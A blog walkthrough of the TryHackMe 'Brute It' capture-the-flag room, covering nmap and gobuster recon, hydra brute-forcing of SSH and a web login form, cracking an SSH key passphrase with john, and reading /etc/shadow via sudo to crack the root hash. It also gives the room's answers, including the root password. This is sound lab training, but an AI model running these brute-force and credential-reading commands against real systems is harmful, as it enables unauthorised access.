---
title: "Challenges: Brute It (TryHackMe)"
datePublished: Sat Jul 12 2025 19:58:28 GMT+0000 (Coordinated Universal Time)
cuid: cmd0o4nm1000302l4d7dbh3iu
slug: challenges-brute-it-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752350129516/99a53793-7017-4b0b-9e6a-31f8fe67d082.png
tags: nmap, enumeration, hashcat, bruteforcing, gobuster, privilege-escalation

---

In this box, we walk through a hands-on experience of a basic CTF-style Linux machine, where we explore critical concepts useful for real-world penetration testing and OSCP prep. The focus is on:

* 🔍 **Reconnaissance** using tools like `nmap` and `gobuster`
    
* 🔐 **Brute-force attacks** on both SSH and web login forms using `hydra`
    
* 🔑 **Cracking private key passphrases** with `john`
    
* 🛠️ **Privilege escalation** by analyzing `sudo` permissions and cracking shadow file hashes
    

Throughout the room, we sharpen our understanding of attack surfaces exposed via web services, and practice chaining small wins — from login panels to shell access — into full system compromise.

Whether you're a beginner learning the ropes or someone brushing up before an exam, this room will help solidify your offensive security fundamentals.

## About this box

In this box you will learn about:

\- Brute-force

\- Hash cracking

\- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

Answer the questions below

Deploy the machine

## Reconnaissance

Before attacking, let's get information about the target

### Answer the questions below

Search for open ports using nmap.  
  
`nmap -p- -sC -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349835581/6c8431a7-db65-4f51-b024-9ff9eb982232.png align="center")

1. How many ports are open?
    
2. What version of SSH is running?
    
3. What version of Apache is running?
    
4. Which Linux distribution is running?
    
5. Search for hidden directories on web server.  
    What is the hidden directory?  
      
    `gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752350079392/25aad145-6159-4c67-8242-fb9f5208dbaf.png align="center")
    
      
      
    take note of user called `john`, it will be important
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752350000625/94817361-e69c-4249-b6ee-23553f1b013b.png align="center")
    
      
      
    `gobuster dir -u IP_Address/admin/ -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349957640/00e8a1f4-4383-43d6-ad8c-e9e9f6e7eb70.png align="center")
    

## Getting a shell

Find a form to get a shell on SSH.

### Answer the questions below

1. What is the user:password of the admin panel?  
      
    I tried using hydra in this way:  
      
    `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://IP_Address   `  
    `hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://IP_Address`  
      
    `hydra -L /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -P /usr/share/wordlists/rockyou.txt ssh://IP_Address`  
      
    that didn’t work went back to the site to try logging in using the username admin and random passwords  
      
    the login form:  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349508935/e42c1b5c-1ea9-40e4-adf7-03efcbb92e07.png align="center")
    
      
    After logging in with random password with our given username, `admin`. Under the Request of the Network tab we see the login form fields `user` and `pass`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349493316/f429622c-b37f-4e8f-aa34-9174e70a69f1.png align="center")
    
      
      
    `hydra -l admin -P /usr/share/wordlists/rockyou.txt IP_Address http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"`
    
    * `/admin/index.php` → the login page URL.
        
    * `user=^USER^&pass=^PASS^` → the exact POST body format, using the input field names from the form. Hydra substitutes `^USER^` and `^PASS^` as it tries each combo.
        
    * `F=Username or password invalid` → tells Hydra what **failure message** to look for in the response. If it **doesn't** find this string, it assumes login was **successful**.
        
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349066728/0a00ae4d-af04-406b-91d6-7312ef10338b.png align="center")
    
      
    the output  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752349766435/01e48fca-57eb-49e8-ae12-f94daf4645c4.png align="center")
    
2. Crack the RSA key you found.  
    What is John's RSA Private Key passphrase?  
      
    you’ll find the id\_rsa here: `http://10.10.107.134/admin/panel/id_rsa`. Create a file to past it to  
      
    `nano id_rsa`  
    
    `/opt/john/ssh2john.py id_rsa > hash.txt`  
    
    `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752348413513/91b84554-1150-487a-ade2-f6ae4a2aa5a6.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752348440440/968c56a9-f02b-44a2-94b7-726f8372a5e6.png align="center")
    
3. user.txt  
      
    `chmod 600 id_rsa`  
    
    `ssh -i id_rsa john@IP_Address`  
    
    `find / -type f -name user.txt 2> /dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752348505857/6f0d94de-645c-4aad-b561-29c1923bc278.png align="center")
    
4. Web flag  
      
    you’ll find the web flag here: [http://10.10.107.134/admin/panel/id\_rsa](http://10.10.107.134/admin/panel/id_rsa).
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752348332623/5cd0bb8e-5ecf-4c28-820a-226385f30a56.png align="center")
    
      
    

## Privilege Escalation

Now, we need to escalate our privileges.

## Answer the questions below

Find a form to escalate your privileges.

1. What is the root's password? `football`  
      
    `sudo /bin/cat /etc/shadow`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752347778000/8524cb97-1553-45fb-a4e6-1d78e2d06f5c.png align="center")
    
    `echo "$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02." > hash11.txt   `  
    `grep -E '^[a-z]{8}$' /usr/share/wordlists/rockyou.txt > 8_letter_words.txt`
    
    `hashcat -m 1800 -a 0 hash11.txt 8_letter_words.txt`  
    
    `john --format=sha512crypt --wordlist=six_letter_words.txt hash6.txt`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752348227666/ef93f2eb-6379-47a1-bb7d-b02e7b1d907d.png align="center")
    
      
    
2. root.txt
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752347689833/e0ffeb4b-7654-437b-b02e-322d71ca8087.png align="center")
    
      
    This box reinforced essential skills for attacking Linux systems:
    
    * 🎯 We started with enumeration using `nmap` and `gobuster`, uncovering both open ports and hidden directories.
        
    * 🔓 We used `hydra` to brute-force both web login forms and SSH authentication, demonstrating how critical weak credentials can be.
        
    * 🧩 We learned to convert private SSH keys into a hash format readable by `john`, and crack the passphrase to gain shell access.
        
    * 🔝 For privilege escalation, we explored the power of `sudo` misconfigurations and cracked a hashed root password using `hashcat`.
        
    
    By the end of this room, we captured all the flags — from web to user to root — and gained a better appreciation for how multiple weak points can be exploited to take control of a system.
    
    Keep practicing, stay curious, and always document your learning journey. On to the next challenge! 💪🔐